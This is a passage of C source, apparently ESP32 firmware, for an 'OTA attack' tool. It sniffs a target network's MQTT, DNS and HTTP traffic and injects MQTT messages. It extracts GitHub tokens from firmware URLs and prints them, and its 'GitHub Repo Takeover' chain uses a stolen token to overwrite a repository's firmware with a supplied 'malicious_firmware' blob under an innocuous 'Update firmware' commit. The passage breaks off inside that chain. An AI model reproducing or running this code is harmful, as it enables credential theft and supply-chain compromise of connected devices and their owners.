        .mqtt_client_id     = "omega_ota",
        .subscribe_topic    = DEFAULT_SUBSCRIBE_TOPIC,
        .inject_topic       = "",
        .inject_payload     = "",
        .inject_count       = DEFAULT_INJECT_COUNT,
        .inject_interval_ms = DEFAULT_INJECT_INTERVAL_MS,
        .firmware_url       = "",
        .verify_ssl         = DEFAULT_VERIFY_SSL,
        .capture_dns        = true,
        .capture_http       = true,
        .target_device_ip   = {0},
        .timeout_sec        = DEFAULT_TIMEOUT_SEC,
    };
    if (wifi_ssid) {
        strncpy(default_cfg.wifi_ssid, wifi_ssid, sizeof(default_cfg.wifi_ssid) - 1);
    }
    if (wifi_password) {
        strncpy(default_cfg.wifi_password, wifi_password, sizeof(default_cfg.wifi_password) - 1);
    }
    ota_attack_start_config(&default_cfg);
}

void ota_attack_start_config(const ota_attack_config_t *new_cfg)
{
    if (running) {
        ESP_LOGW(TAG, "Already running -- stop first");
        return;
    }

    xSemaphoreTake(mutex, portMAX_DELAY);
    if (new_cfg) {
        cfg = *new_cfg;
    }
    /* Ensure null-termination */
    cfg.wifi_ssid[sizeof(cfg.wifi_ssid) - 1] = '\0';
    cfg.wifi_password[sizeof(cfg.wifi_password) - 1] = '\0';
    cfg.mqtt_broker[sizeof(cfg.mqtt_broker) - 1] = '\0';
    cfg.subscribe_topic[sizeof(cfg.subscribe_topic) - 1] = '\0';
    xSemaphoreGive(mutex);

    /* Reset counters */
    mqtt_msg_count     = 0;
    url_count          = 0;
    github_url_count   = 0;
    inject_count       = 0;
    download_count     = 0;
    fail_count         = 0;
    dns_count          = 0;
    http_count         = 0;
    ota_dns_count      = 0;
    ota_http_count     = 0;
    msg_head           = 0;
    msg_count          = 0;
    url_entries        = 0;
    dns_entry_count    = 0;
    http_entry_count   = 0;
    attack_state       = OTA_STATE_IDLE;
    attack_mode        = cfg.mode;
    timeout_fired      = false;
    wifi_connected     = false;
    wifi_has_ip        = false;
    mqtt_connected     = false;
    download_result_json[0] = '\0';

    if (firmware_buffer) {
        free(firmware_buffer);
        firmware_buffer = NULL;
    }
    firmware_downloaded_size = 0;

    /* Reset semaphores */
    if (wifi_sem)     xSemaphoreTake(wifi_sem, 0);
    if (mqtt_sem)     xSemaphoreTake(mqtt_sem, 0);
    if (download_sem) xSemaphoreTake(download_sem, 0);

    /* Start timeout timer */
    if (timeout_timer) {
        esp_timer_start_once(timeout_timer,
                             (uint64_t)cfg.timeout_sec * 1000000);
    }

    running = true;

    BaseType_t created = xTaskCreate(attack_task, "ota_attack",
                                     TASK_STACK_SIZE, NULL,
                                     TASK_PRIORITY, &task_handle);
    if (created != pdPASS) {
        ESP_LOGE(TAG, "Failed to create OTA attack task");
        running = false;
        if (timeout_timer) {
            esp_timer_stop(timeout_timer);
        }
    }
}

void ota_attack_stop(void)
{
    if (!running) return;

    ESP_LOGI(TAG, "Stopping OTA attack...");
    running = false;

    /* Wake task if blocked on any semaphore */
    if (wifi_sem)     xSemaphoreGive(wifi_sem);
    if (mqtt_sem)     xSemaphoreGive(mqtt_sem);
    if (download_sem) xSemaphoreGive(download_sem);

    /* Wait for task to exit */
    if (task_exit_sem) {
        if (xSemaphoreTake(task_exit_sem, pdMS_TO_TICKS(STOP_SEM_TIMEOUT_MS)) != pdTRUE) {
            ESP_LOGW(TAG, "Task exit timeout");
            if (task_handle != NULL) {
                vTaskDelete(task_handle);
                task_handle = NULL;
            }
        }
    }

    /* Cleanup MQTT client */
    if (mqtt_client) {
        esp_mqtt_client_stop(mqtt_client);
        esp_mqtt_client_destroy(mqtt_client);
        mqtt_client = NULL;
        mqtt_connected = false;
    }

    /* Disable promiscuous mode if active */
    esp_wifi_set_promiscuous(false);

    /* Restore WiFi to AP-only mode */
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_start();

    if (timeout_timer) {
        esp_timer_stop(timeout_timer);
    }

    attack_state = OTA_STATE_IDLE;
    task_handle = NULL;

    ESP_LOGI(TAG, "OTA attack stopped (msgs=%u, urls=%u, github=%u)",
             (unsigned)mqtt_msg_count, (unsigned)url_count,
             (unsigned)github_url_count);
}

/* ================================================================== */
/*  Public API -- Status getters                                       */
/* ================================================================== */

bool ota_attack_is_running(void)
{
    return running;
}

ota_attack_state_t ota_attack_get_state(void)
{
    return attack_state;
}

ota_attack_mode_t ota_attack_get_mode(void)
{
    return attack_mode;
}

uint32_t ota_attack_get_mqtt_msg_count(void)
{
    return mqtt_msg_count;
}

uint32_t ota_attack_get_url_count(void)
{
    return url_count;
}

uint32_t ota_attack_get_github_url_count(void)
{
    return github_url_count;
}

uint32_t ota_attack_get_inject_count(void)
{
    return inject_count;
}

uint32_t ota_attack_get_download_count(void)
{
    return download_count;
}

uint32_t ota_attack_get_fail_count(void)
{
    return fail_count;
}

uint32_t ota_attack_get_dns_count(void)
{
    return dns_count;
}

uint32_t ota_attack_get_http_count(void)
{
    return http_count;
}

uint32_t ota_attack_get_ota_dns_count(void)
{
    return ota_dns_count;
}

uint32_t ota_attack_get_ota_http_count(void)
{
    return ota_http_count;
}

int32_t ota_attack_get_elapsed_sec(void)
{
    if (!running && start_time_ms == 0) return 0;
    int64_t elapsed = now_ms() - start_time_ms;
    return (int32_t)(elapsed / 1000);
}

int32_t ota_attack_get_remaining_sec(void)
{
    if (!running) return 0;
    int32_t elapsed  = ota_attack_get_elapsed_sec();
    int32_t remaining = (int32_t)cfg.timeout_sec - elapsed;
    return remaining > 0 ? remaining : 0;
}

bool ota_attack_was_timeout(void)
{
    return timeout_fired;
}

cJSON *ota_attack_get_status_json(void)
{
    cJSON *root = cJSON_CreateObject();
    if (!root) return NULL;

    cJSON_AddBoolToObject(root, "running", running);
    cJSON_AddStringToObject(root, "state", ota_attack_get_state_str());
    cJSON_AddStringToObject(root, "mode", mode_str(cfg.mode));

    cJSON_AddStringToObject(root, "wifi_ssid",
                            cfg.wifi_ssid[0] ? cfg.wifi_ssid : "");
    cJSON_AddStringToObject(root, "mqtt_broker",
                            cfg.mqtt_broker[0] ? cfg.mqtt_broker : "");
    cJSON_AddNumberToObject(root, "mqtt_port", cfg.mqtt_port);
    cJSON_AddBoolToObject(root, "mqtt_connected", mqtt_connected);

    cJSON_AddNumberToObject(root, "mqtt_msg_count", mqtt_msg_count);
    cJSON_AddNumberToObject(root, "url_count", url_count);
    cJSON_AddNumberToObject(root, "github_url_count", github_url_count);
    cJSON_AddNumberToObject(root, "inject_count", inject_count);
    cJSON_AddNumberToObject(root, "download_count", download_count);
    cJSON_AddNumberToObject(root, "fail_count", fail_count);
    cJSON_AddNumberToObject(root, "dns_count", dns_count);
    cJSON_AddNumberToObject(root, "http_count", http_count);
    cJSON_AddNumberToObject(root, "ota_dns_count", ota_dns_count);
    cJSON_AddNumberToObject(root, "ota_http_count", ota_http_count);
    cJSON_AddNumberToObject(root, "timeout_sec", cfg.timeout_sec);
    cJSON_AddNumberToObject(root, "elapsed_sec",
                            ota_attack_get_elapsed_sec());
    cJSON_AddNumberToObject(root, "remaining_sec",
                            ota_attack_get_remaining_sec());
    cJSON_AddBoolToObject(root, "timeout_fired", timeout_fired);

    return root;
}

/* ================================================================== */
/*  Public API -- Interactive operations                               */
/* ================================================================== */

const char *ota_attack_get_captured_messages_json(void)
{
    static char json_buf[4096];
    cJSON *root = cJSON_CreateArray();

    int start = (msg_count >= OTA_MAX_CAPTURED_MSGS) ? msg_head : 0;
    int count = (msg_count >= OTA_MAX_CAPTURED_MSGS) ? OTA_MAX_CAPTURED_MSGS : msg_count;

    for (int i = 0; i < count; i++) {
        int idx = (start + i) % OTA_MAX_CAPTURED_MSGS;
        cJSON *item = cJSON_CreateObject();
        cJSON_AddStringToObject(item, "topic", captured_msgs[idx].topic);
        cJSON_AddStringToObject(item, "payload", captured_msgs[idx].payload);
        cJSON_AddNumberToObject(item, "timestamp_ms",
                                (double)captured_msgs[idx].timestamp_ms);
        cJSON_AddItemToArray(root, item);
    }

    char *printed = cJSON_PrintUnformatted(root);
    snprintf(json_buf, sizeof(json_buf), "%s", printed ? printed : "[]");
    cJSON_Delete(root);
    free(printed);

    return json_buf;
}

const char *ota_attack_get_captured_urls_json(void)
{
    static char json_buf[4096];
    cJSON *root = cJSON_CreateArray();

    for (int i = 0; i < url_entries; i++) {
        cJSON *item = cJSON_CreateObject();
        cJSON_AddStringToObject(item, "url", captured_urls[i].url);
        cJSON_AddStringToObject(item, "source", captured_urls[i].source_topic);
        cJSON_AddBoolToObject(item, "github", captured_urls[i].has_github_token);
        cJSON_AddBoolToObject(item, "downloaded", captured_urls[i].downloaded);
        cJSON_AddNumberToObject(item, "firmware_size", captured_urls[i].firmware_size);
        cJSON_AddNumberToObject(item, "timestamp_ms",
                                (double)captured_urls[i].timestamp_ms);
        cJSON_AddItemToArray(root, item);
    }

    char *printed = cJSON_PrintUnformatted(root);
    snprintf(json_buf, sizeof(json_buf), "%s", printed ? printed : "[]");
    cJSON_Delete(root);
    free(printed);

    return json_buf;
}

const char *ota_attack_get_urls_json(void)
{
    static char json_buf[8192];
    cJSON *root = cJSON_CreateArray();

    for (int i = 0; i < url_entries; i++) {
        cJSON *item = cJSON_CreateObject();
        cJSON_AddNumberToObject(item, "index", i);
        cJSON_AddStringToObject(item, "url", captured_urls[i].url);
        cJSON_AddStringToObject(item, "source", captured_urls[i].source_topic);
        cJSON_AddBoolToObject(item, "has_github_token", captured_urls[i].has_github_token);
        cJSON_AddBoolToObject(item, "downloaded", captured_urls[i].downloaded);
        cJSON_AddNumberToObject(item, "firmware_size", captured_urls[i].firmware_size);
        cJSON_AddNumberToObject(item, "timestamp_ms",
                                (double)captured_urls[i].timestamp_ms);

        /* Include extracted GitHub token if present */
        if (captured_urls[i].has_github_token) {
            char token[128] = "";
            extract_github_token(captured_urls[i].url, token, sizeof(token));
            if (token[0]) {
                cJSON_AddStringToObject(item, "token", token);
            }
        }

        cJSON_AddItemToArray(root, item);
    }

    char *printed = cJSON_PrintUnformatted(root);
    snprintf(json_buf, sizeof(json_buf), "%s", printed ? printed : "[]");
    cJSON_Delete(root);
    free(printed);

    return json_buf;
}

const char *ota_attack_get_github_urls_json(void)
{
    static char json_buf[4096];
    cJSON *root = cJSON_CreateArray();

    for (int i = 0; i < url_entries; i++) {
        if (!captured_urls[i].has_github_token) continue;
        cJSON *item = cJSON_CreateObject();
        cJSON_AddStringToObject(item, "url", captured_urls[i].url);
        cJSON_AddStringToObject(item, "source", captured_urls[i].source_topic);

        /* Extract and include the token */
        char token[128] = "";
        extract_github_token(captured_urls[i].url, token, sizeof(token));
        if (token[0]) {
            cJSON_AddStringToObject(item, "token", token);
        }

        cJSON_AddBoolToObject(item, "downloaded", captured_urls[i].downloaded);
        cJSON_AddNumberToObject(item, "firmware_size", captured_urls[i].firmware_size);
        cJSON_AddNumberToObject(item, "timestamp_ms",
                                (double)captured_urls[i].timestamp_ms);
        cJSON_AddItemToArray(root, item);
    }

    char *printed = cJSON_PrintUnformatted(root);
    snprintf(json_buf, sizeof(json_buf), "%s", printed ? printed : "[]");
    cJSON_Delete(root);
    free(printed);

    return json_buf;
}

bool ota_attack_inject_message(const char *topic, const char *payload)
{
    if (!topic || !payload || !mqtt_client || !mqtt_connected) {
        ESP_LOGW(TAG, "Cannot inject: not connected or invalid params");
        return false;
    }

    int msg_id = esp_mqtt_client_publish(mqtt_client, topic, payload, 0, 1, 0);
    if (msg_id >= 0) {
        inject_count++;
        ESP_LOGI(TAG, "Injected message (msg_id=%d): %s -> %s", msg_id, topic, payload);

        store_captured_message(topic, strlen(topic), payload, strlen(payload));
        scan_payload_for_urls(topic, payload, strlen(payload));
        return true;
    }

    fail_count++;
    ESP_LOGW(TAG, "Failed to inject message");
    return false;
}

bool ota_attack_download_firmware(int url_index)
{
    if (url_index < 0 || url_index >= url_entries) {
        ESP_LOGW(TAG, "Invalid URL index: %d (max=%d)", url_index, url_entries);
        return false;
    }

    if (captured_urls[url_index].downloaded) {
        ESP_LOGW(TAG, "URL already downloaded: %s", captured_urls[url_index].url);
        return false;
    }

    esp_err_t err = download_firmware_internal(captured_urls[url_index].url);
    return (err == ESP_OK);
}

const char *ota_attack_get_download_result_json(void)
{
    if (download_result_json[0] == '\0') {
        return "{\"success\":false,\"error\":\"No download performed\"}";
    }
    return download_result_json;
}

const char *ota_attack_get_dns_entries_json(void)
{
    static char json_buf[4096];
    cJSON *root = cJSON_CreateArray();

    for (int i = 0; i < dns_entry_count; i++) {
        cJSON *item = cJSON_CreateObject();
        cJSON_AddStringToObject(item, "domain", dns_entries[i].domain);

        char client_ip_str[16];
        snprintf(client_ip_str, sizeof(client_ip_str), "%u.%u.%u.%u",
                 (unsigned)dns_entries[i].client_ip[0],
                 (unsigned)dns_entries[i].client_ip[1],
                 (unsigned)dns_entries[i].client_ip[2],
                 (unsigned)dns_entries[i].client_ip[3]);
        cJSON_AddStringToObject(item, "client_ip", client_ip_str);

        char server_ip_str[16];
        snprintf(server_ip_str, sizeof(server_ip_str), "%u.%u.%u.%u",
                 (unsigned)dns_entries[i].server_ip[0],
                 (unsigned)dns_entries[i].server_ip[1],
                 (unsigned)dns_entries[i].server_ip[2],
                 (unsigned)dns_entries[i].server_ip[3]);
        cJSON_AddStringToObject(item, "server_ip", server_ip_str);

        cJSON_AddBoolToObject(item, "ota_related", dns_entries[i].is_ota_related);
        cJSON_AddNumberToObject(item, "timestamp_ms",
                                (double)dns_entries[i].timestamp_ms);
        cJSON_AddItemToArray(root, item);
    }

    char *printed = cJSON_PrintUnformatted(root);
    snprintf(json_buf, sizeof(json_buf), "%s", printed ? printed : "[]");
    cJSON_Delete(root);
    free(printed);

    return json_buf;
}

const char *ota_attack_get_http_entries_json(void)
{
    static char json_buf[4096];
    cJSON *root = cJSON_CreateArray();

    for (int i = 0; i < http_entry_count; i++) {
        cJSON *item = cJSON_CreateObject();
        cJSON_AddStringToObject(item, "method", http_entries[i].method);
        cJSON_AddStringToObject(item, "host", http_entries[i].host);
        cJSON_AddStringToObject(item, "path", http_entries[i].path);
        cJSON_AddStringToObject(item, "full_url", http_entries[i].full_url);

        char client_ip_str[16];
        snprintf(client_ip_str, sizeof(client_ip_str), "%u.%u.%u.%u",
                 (unsigned)http_entries[i].client_ip[0],
                 (unsigned)http_entries[i].client_ip[1],
                 (unsigned)http_entries[i].client_ip[2],
                 (unsigned)http_entries[i].client_ip[3]);
        cJSON_AddStringToObject(item, "client_ip", client_ip_str);

        cJSON_AddBoolToObject(item, "ota_related", http_entries[i].is_ota_related);
        cJSON_AddNumberToObject(item, "timestamp_ms",
                                (double)http_entries[i].timestamp_ms);
        cJSON_AddItemToArray(root, item);
    }

    char *printed = cJSON_PrintUnformatted(root);
    snprintf(json_buf, sizeof(json_buf), "%s", printed ? printed : "[]");
    cJSON_Delete(root);
    free(printed);

    return json_buf;
}

/* ================================================================== */
/*  GitHub Repo Takeover - API Functions                               */
/*                                                                    */
/*  Uses GitHub REST API v3 to:                                       */
/*    1. Parse firmware URL -> owner/repo/path/branch/token            */
/*    2. Verify token has repo access                                 */
/*    3. List repo files                                              */
/*    4. Get file SHA (needed for update)                             */
/*    5. Upload/replace firmware via Contents API (PUT)               */
/* ================================================================== */

/* GitHub API response buffer */
static char *gh_api_resp_buf = NULL;
static int gh_api_resp_len = 0;

/* GitHub result JSON */
static char gh_result_json[1024] = "";

/* GitHub repo state */
static ota_github_repo_t current_repo;

/* Base64 encoding table */
static const char b64_table[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/* Simple base64 encode */
static int base64_encode(const uint8_t *src, int src_len, char *dst, int dst_max)
{
    int i = 0, j = 0;
    while (i < src_len && j + 4 < dst_max) {
        uint32_t a = (i < src_len) ? src[i++] : 0;
        uint32_t b_v = (i < src_len) ? src[i++] : 0;
        uint32_t c = (i < src_len) ? src[i++] : 0;
        uint32_t triple = (a << 16) | (b_v << 8) | c;

        dst[j++] = b64_table[(triple >> 18) & 0x3F];
        dst[j++] = b64_table[(triple >> 12) & 0x3F];
        dst[j++] = (i > src_len + 1) ? '=' : b64_table[(triple >> 6) & 0x3F];
        dst[j++] = (i > src_len) ? '=' : b64_table[triple & 0x3F];
    }
    dst[j] = '\0';
    return j;
}

/* HTTP callback for GitHub API responses */
static esp_err_t gh_http_cb(esp_http_client_event_t *evt)
{
    switch (evt->event_id) {
    case HTTP_EVENT_ON_DATA:
        if (gh_api_resp_buf && gh_api_resp_len + evt->data_len < OTA_GH_API_RESP_LEN) {
            memcpy(gh_api_resp_buf + gh_api_resp_len, evt->data, evt->data_len);
            gh_api_resp_len += evt->data_len;
            gh_api_resp_buf[gh_api_resp_len] = '\0';
        }
        break;
    default:
        break;
    }
    return ESP_OK;
}

/* Make a GitHub API request. Returns HTTP status code or -1 on error. */
static int gh_api_request(const char *method, const char *api_path,
                           const char *token, const char *body, int body_len)
{
    if (gh_api_resp_buf) {
        gh_api_resp_buf[0] = '\0';
    }
    gh_api_resp_len = 0;

    char url[256];
    snprintf(url, sizeof(url), "https://api.github.com%s", api_path);

    ESP_LOGI(TAG, "GH API %s %s", method, api_path);

    esp_http_client_config_t http_cfg = {
        .url = url,
        .event_handler = gh_http_cb,
        .timeout_ms = 30000,
    };
    http_cfg.skip_cert_common_name_check = true;
    http_cfg.cert_pem = NULL;

    esp_http_client_handle_t client = esp_http_client_init(&http_cfg);
    if (!client) {
        ESP_LOGE(TAG, "GH API: Failed to init HTTP client");
        return -1;
    }

    /* Set headers */
    char auth_hdr[192];
    snprintf(auth_hdr, sizeof(auth_hdr), "token %s", token);
    esp_http_client_set_header(client, "Authorization", auth_hdr);
    esp_http_client_set_header(client, "Accept", "application/vnd.github.v3+json");
    esp_http_client_set_header(client, "User-Agent", "OmegaSolutions");
    esp_http_client_set_header(client, "Content-Type", "application/json");

    if (strcmp(method, "GET") == 0) {
        esp_http_client_set_method(client, HTTP_METHOD_GET);
    } else {
        esp_http_client_set_method(client, HTTP_METHOD_PUT);
        if (body && body_len > 0) {
            esp_http_client_set_post_field(client, body, body_len);
        }
    }

    esp_err_t err = esp_http_client_perform(client);
    int status = esp_http_client_get_status_code(client);
    esp_http_client_cleanup(client);

    if (err != ESP_OK) {
        ESP_LOGE(TAG, "GH API: HTTP request failed: %d", err);
        return -1;
    }

    ESP_LOGI(TAG, "GH API: %s %s -> HTTP %d", method, api_path, status);
    return status;
}

/* ---- Parse GitHub URL ---- */
bool ota_attack_parse_github_url(const char *url, ota_github_repo_t *out)
{
    if (!url || !out) return false;
    memset(out, 0, sizeof(*out));

    const char *raw_prefix = "raw.githubusercontent.com/";
    const char *raw_pos = strstr(url, raw_prefix);
    if (raw_pos) {
        raw_pos += strlen(raw_prefix);
        int i = 0;
        while (*raw_pos != '/' && *raw_pos != '\0' && *raw_pos != '?' && i < OTA_GH_OWNER_LEN - 1) {
            out->owner[i++] = *raw_pos++;
        }
        out->owner[i] = '\0';
        if (*raw_pos != '/') { out->parsed = false; return false; }
        raw_pos++;
        i = 0;
        while (*raw_pos != '/' && *raw_pos != '\0' && *raw_pos != '?' && i < OTA_GH_REPO_LEN - 1) {
            out->repo[i++] = *raw_pos++;
        }
        out->repo[i] = '\0';
        if (*raw_pos != '/') { out->parsed = true; return true; }
        raw_pos++;
        i = 0;
        while (*raw_pos != '/' && *raw_pos != '\0' && *raw_pos != '?' && i < OTA_GH_BRANCH_LEN - 1) {
            out->branch[i++] = *raw_pos++;
        }
        out->branch[i] = '\0';
        if (*raw_pos != '/') { out->parsed = true; return true; }
        raw_pos++;
        i = 0;
        while (*raw_pos != '\0' && *raw_pos != '?' && i < OTA_GH_PATH_LEN - 1) {
            out->path[i++] = *raw_pos++;
        }
        out->path[i] = '\0';
    }
    else {
        const char *gh_prefix = "github.com/";
        const char *gh_pos = strstr(url, gh_prefix);
        if (!gh_pos) { out->parsed = false; return false; }
        gh_pos += strlen(gh_prefix);
        int i = 0;
        while (*gh_pos != '/' && *gh_pos != '\0' && *gh_pos != '?' && i < OTA_GH_OWNER_LEN - 1) {
            out->owner[i++] = *gh_pos++;
        }
        out->owner[i] = '\0';
        if (*gh_pos != '/') { out->parsed = false; return false; }
        gh_pos++;
        i = 0;
        while (*gh_pos != '/' && *gh_pos != '\0' && *gh_pos != '?' && i < OTA_GH_REPO_LEN - 1) {
            out->repo[i++] = *gh_pos++;
        }
        out->repo[i] = '\0';
        strncpy(out->branch, "main", OTA_GH_BRANCH_LEN - 1);
        if (*gh_pos == '/') {
            gh_pos++;
            const char *skip_prefixes[] = { "releases/download/", "blob/", "raw/", "tree/", NULL };
            for (int s = 0; skip_prefixes[s]; s++) {
                if (strncmp(gh_pos, skip_prefixes[s], strlen(skip_prefixes[s])) == 0) {
                    gh_pos += strlen(skip_prefixes[s]);
                    if (strcmp(skip_prefixes[s], "blob/") == 0 || strcmp(skip_prefixes[s], "tree/") == 0) {
                        int bi = 0;
                        while (*gh_pos != '/' && *gh_pos != '\0' && bi < OTA_GH_BRANCH_LEN - 1) {
                            out->branch[bi++] = *gh_pos++;
                        }
                        out->branch[bi] = '\0';
                        if (*gh_pos == '/') gh_pos++;
                    } else if (strcmp(skip_prefixes[s], "releases/download/") == 0) {
                        int ti = 0;
                        while (*gh_pos != '/' && *gh_pos != '\0' && ti < OTA_GH_BRANCH_LEN - 1) {
                            out->branch[ti++] = *gh_pos++;
                        }
                        out->branch[ti] = '\0';
                        if (*gh_pos == '/') gh_pos++;
                    }
                    break;
                }
            }
            int pi = 0;
            while (*gh_pos != '\0' && *gh_pos != '?' && pi < OTA_GH_PATH_LEN - 1) {
                out->path[pi++] = *gh_pos++;
            }
            out->path[pi] = '\0';
        }
    }

    extract_github_token(url, out->token, OTA_GH_TOKEN_LEN);
    out->parsed = (out->owner[0] && out->repo[0]);
    if (out->parsed) {
        ESP_LOGI(TAG, "GH PARSE: owner=%s repo=%s branch=%s path=%s token=%s",
                 out->owner, out->repo, out->branch, out->path,
                 out->token[0] ? "***PRESENT***" : "NONE");
    }
    return out->parsed;
}

/* ---- Access repo with token ---- */
bool ota_attack_github_access_repo(ota_github_repo_t *repo)
{
    if (!repo || !repo->parsed || !repo->token[0]) return false;
    char api_path[192];
    snprintf(api_path, sizeof(api_path), "/repos/%s/%s", repo->owner, repo->repo);
    if (!gh_api_resp_buf) { gh_api_resp_buf = malloc(OTA_GH_API_RESP_LEN); }
    if (!gh_api_resp_buf) return false;
    int status = gh_api_request("GET", api_path, repo->token, NULL, 0);
    if (status == 200) {
        repo->token_valid = true;
        if (gh_api_resp_buf && strstr(gh_api_resp_buf, "\"push\":true")) {
            ESP_LOGI(TAG, "GH ACCESS: Token has PUSH access!");
        } else if (gh_api_resp_buf && strstr(gh_api_resp_buf, "\"push\":false")) {
            ESP_LOGW(TAG, "GH ACCESS: Token has READ but NO push access");
            repo->token_valid = false;
        } else {
            repo->token_valid = true;
        }
        snprintf(gh_result_json, sizeof(gh_result_json),
                 "{\"access\":true,\"owner\":\"%s\",\"repo\":\"%s\",\"push\":%s}",
                 repo->owner, repo->repo, repo->token_valid ? "true" : "false");
    } else {
        repo->token_valid = false;
        snprintf(gh_result_json, sizeof(gh_result_json), "{\"access\":false,\"status\":%d}", status);
    }
    return (status == 200);
}

/* ---- List files ---- */
const char *ota_attack_github_list_files(ota_github_repo_t *repo, const char *path)
{
    if (!repo || !repo->parsed || !repo->token[0]) return "[]";
    if (!gh_api_resp_buf) { gh_api_resp_buf = malloc(OTA_GH_API_RESP_LEN); }
    if (!gh_api_resp_buf) return "[]";
    char api_path[192];
    if (path && path[0]) {
        snprintf(api_path, sizeof(api_path), "/repos/%s/%s/contents/%s?ref=%s",
                 repo->owner, repo->repo, path, repo->branch);
    } else {
        snprintf(api_path, sizeof(api_path), "/repos/%s/%s/contents/?ref=%s",
                 repo->owner, repo->repo, repo->branch);
    }
    int status = gh_api_request("GET", api_path, repo->token, NULL, 0);
    static char result_buf[2048];
    if (status == 200 && gh_api_resp_buf) {
        cJSON *root = cJSON_Parse(gh_api_resp_buf);
        if (root && cJSON_IsArray(root)) {
            cJSON *simplified = cJSON_CreateArray();
            int count = cJSON_GetArraySize(root);
            for (int i = 0; i < count && i < 20; i++) {
                cJSON *item = cJSON_GetArrayItem(root, i);
                cJSON *name = cJSON_GetObjectItem(item, "name");
                cJSON *f_type = cJSON_GetObjectItem(item, "type");
                cJSON *sha = cJSON_GetObjectItem(item, "sha");
                cJSON *size = cJSON_GetObjectItem(item, "size");
                cJSON *sitem = cJSON_CreateObject();
                if (name) cJSON_AddStringToObject(sitem, "name", name->valuestring);
                if (f_type) cJSON_AddStringToObject(sitem, "type", f_type->valuestring);
                if (sha) cJSON_AddStringToObject(sitem, "sha", sha->valuestring);
                if (size) cJSON_AddNumberToObject(sitem, "size", size->valuedouble);
                cJSON_AddItemToArray(simplified, sitem);
            }
            char *printed = cJSON_PrintUnformatted(simplified);
            snprintf(result_buf, sizeof(result_buf), "%s", printed ? printed : "[]");
            cJSON_Delete(simplified);
            free(printed);
            cJSON_Delete(root);
            return result_buf;
        }
        if (root) cJSON_Delete(root);
    }
    snprintf(result_buf, sizeof(result_buf), "{\"error\":true,\"status\":%d}", status);
    return result_buf;
}

/* ---- Get file SHA ---- */
bool ota_attack_github_get_file_sha(ota_github_repo_t *repo, const char *file_path)
{
    if (!repo || !repo->parsed || !repo->token[0]) return false;
    if (!gh_api_resp_buf) { gh_api_resp_buf = malloc(OTA_GH_API_RESP_LEN); }
    if (!gh_api_resp_buf) return false;
    char api_path[192];
    snprintf(api_path, sizeof(api_path), "/repos/%s/%s/contents/%s?ref=%s",
             repo->owner, repo->repo, file_path, repo->branch);
    int status = gh_api_request("GET", api_path, repo->token, NULL, 0);
    if (status == 200 && gh_api_resp_buf) {
        cJSON *root = cJSON_Parse(gh_api_resp_buf);
        if (root) {
            cJSON *sha = cJSON_GetObjectItem(root, "sha");
            if (sha && sha->valuestring) {
                strncpy(repo->file_sha, sha->valuestring, OTA_GH_SHA_LEN - 1);
                repo->file_sha[OTA_GH_SHA_LEN - 1] = '\0';
                cJSON_Delete(root);
                return true;
            }
            cJSON_Delete(root);
        }
    }
    return false;
}

/* ---- Upload firmware ---- */
bool ota_attack_github_upload_firmware(ota_github_repo_t *repo,
                                        const uint8_t *firmware_data,
                                        uint32_t firmware_size,
                                        const char *target_path,
                                        const char *commit_msg)
{
    if (!repo || !repo->parsed || !repo->token[0]) return false;
    if (!firmware_data || firmware_size == 0) return false;
    if (!gh_api_resp_buf) { gh_api_resp_buf = malloc(OTA_GH_API_RESP_LEN); }
    if (!gh_api_resp_buf) return false;
    ESP_LOGI(TAG, "GH UPLOAD: %u bytes to %s/%s:%s",
             (unsigned)firmware_size, repo->owner, repo->repo,
             target_path ? target_path : repo->path);
    int b64_max = ((firmware_size + 2) / 3) * 4 + 4;
    char *b64_data = malloc(b64_max);
    if (!b64_data) return false;
    base64_encode(firmware_data, (int)firmware_size, b64_data, b64_max);
    int body_max = 256 + (int)strlen(b64_data) + (repo->file_sha[0] ? 80 : 0);
    char *body = malloc(body_max);
    if (!body) { free(b64_data); return false; }
    const char *tpath = target_path ? target_path : repo->path;
    const char *cmsg = commit_msg ? commit_msg : "Update firmware";
    if (repo->file_sha[0]) {
        snprintf(body, body_max,
                 "{\"message\":\"%s\",\"content\":\"%s\",\"sha\":\"%s\",\"branch\":\"%s\"}",
                 cmsg, b64_data, repo->file_sha, repo->branch);
    } else {
        snprintf(body, body_max,
                 "{\"message\":\"%s\",\"content\":\"%s\",\"branch\":\"%s\"}",
                 cmsg, b64_data, repo->branch);
    }
    free(b64_data);
    char api_path[192];
    snprintf(api_path, sizeof(api_path), "/repos/%s/%s/contents/%s",
             repo->owner, repo->repo, tpath);
    int body_len = (int)strlen(body);
    int status = gh_api_request("PUT", api_path, repo->token, body, body_len);
    free(body);
    if (status == 200 || status == 201) {
        ESP_LOGI(TAG, "GH UPLOAD: SUCCESS!");
        snprintf(gh_result_json, sizeof(gh_result_json),
                 "{\"uploaded\":true,\"owner\":\"%s\",\"repo\":\"%s\",\"path\":\"%s\",\"size\":%u,\"status\":%d}",
                 repo->owner, repo->repo, tpath, (unsigned)firmware_size, status);
        return true;
    } else {
        ESP_LOGE(TAG, "GH UPLOAD: FAILED (HTTP %d)", status);
        snprintf(gh_result_json, sizeof(gh_result_json), "{\"uploaded\":false,\"status\":%d}", status);
        return false;
    }
}

/* ---- Full takeover chain ---- */
bool ota_attack_github_takeover_chain(const char *wifi_ssid,
                                       const char *wifi_password,
                                       const char *mqtt_broker,
                                       uint16_t mqtt_port,
                                       const uint8_t *malicious_fw,
                                       uint32_t malicious_fw_size,
                                       uint32_t wait_for_device_sec)
{
    ota_attack_config_t takeover_cfg = {
        .mode               = OTA_MODE_GITHUB_TAKEOVER,
        .mqtt_port          = mqtt_port ? mqtt_port : 1883,
        .mqtt_client_id     = "omega_ota_gh",
        .subscribe_topic    = "#",
        .inject_count       = 1,
        .inject_interval_ms = 0,
        .verify_ssl         = false,
        .capture_dns        = true,
        .capture_http       = true,
        .target_device_ip   = {0},
        .gh_firmware_path   = "",
        .gh_branch          = "main",
        .gh_commit_msg      = "Update firmware",
        .malicious_firmware = (uint8_t *)malicious_fw,
        .malicious_firmware_size = malicious_fw_size,
        .gh_captured_url_index = -1,
        .timeout_sec        = 600,
    };
    if (wifi_ssid) strncpy(takeover_cfg.wifi_ssid, wifi_ssid, sizeof(takeover_cfg.wifi_ssid) - 1);
    if (wifi_password) strncpy(takeover_cfg.wifi_password, wifi_password, sizeof(takeover_cfg.wifi_password) - 1);
    if (mqtt_broker) strncpy(takeover_cfg.mqtt_broker, mqtt_broker, sizeof(takeover_cfg.mqtt_broker) - 1);
    ota_attack_start_config(&takeover_cfg);
